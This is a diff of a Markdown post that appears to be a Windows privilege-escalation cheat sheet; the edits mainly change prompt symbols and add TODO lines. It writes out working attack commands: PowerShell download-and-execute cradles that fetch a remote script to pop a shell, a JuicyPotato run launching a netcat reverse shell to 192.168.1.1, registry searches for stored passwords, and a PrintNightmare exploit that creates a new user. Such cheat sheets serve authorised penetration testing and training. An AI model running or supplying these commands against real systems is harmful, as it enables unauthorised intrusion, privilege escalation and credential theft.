@@ -11,17 +11,17 @@ layout: post
 ```
 How to use powershell to pop a second connection with interactive shell
 Open a listener on 1 port and a web server with payload on another. Then run:
-> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')"
+$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')"
 
 
 Starting a shell as Administrator (when the password is known)
 
 First: make a variable of the credentials. Because Windows doesn't like it when you pass passwords in plain text to a command
-> $SecPass = ConvertTo-SecureString "password" -AsPlainText -Force
-> $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
+$ $SecPass = ConvertTo-SecureString "password" -AsPlainText -Force
+$ $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
 
 Then pop the shell
-> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')" -Credential $cred
+$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')" -Credential $cred
 ```
 
 
@@ -48,32 +48,35 @@ List of CLSID's:
 http://ohpe.it/juicy-potato/CLSID/
 
 On attacker system:
-> nc -nvlp 80
+$ nc -nvlp 80
 On target system:
 First upload nc.exe & JuicyPotato.exe, and place it in current dir
-> JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -t *
+$ JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -t *
 Or using a different CLSID:
-> JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
+$ JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
 ```
 
 ###### Autologon Credentials in registry
 ```
 search for "Password" string:
-> reg query HKLM /f Password /t Reg_SZ /s
+$ reg query HKLM /f Password /t Reg_SZ /s
 query the specific registry entry (example):
-> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+$ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
 
 ###### RunAs
+/////////////////TODO:
 
 ###### Unquoted Path
+/////////////////TODO:
+
 
 ###### DLL Hijacking
+/////////////////TODO:
 
 
 ###### Port Forwarding
 ```
-
 https://github.com/jpillora/chisel
 1 upload chisel to the box
 
@@ -105,6 +108,6 @@ https://github.com/EmpireProject/Empire/tree/master/data/module_source
 https://github.com/calebstewart/CVE-2021-1675/
 
 Run with (in powershell):
-> powershell -exec bypass -command "& { Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare; }"
-> Invoke-Nightmare -NewUser "username" -NewPassword "password" -DriverName "PrintMe"
+$ powershell -exec bypass -command "& { Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare; }"
+$ Invoke-Nightmare -NewUser "username" -NewPassword "password" -DriverName "PrintMe"
 ```
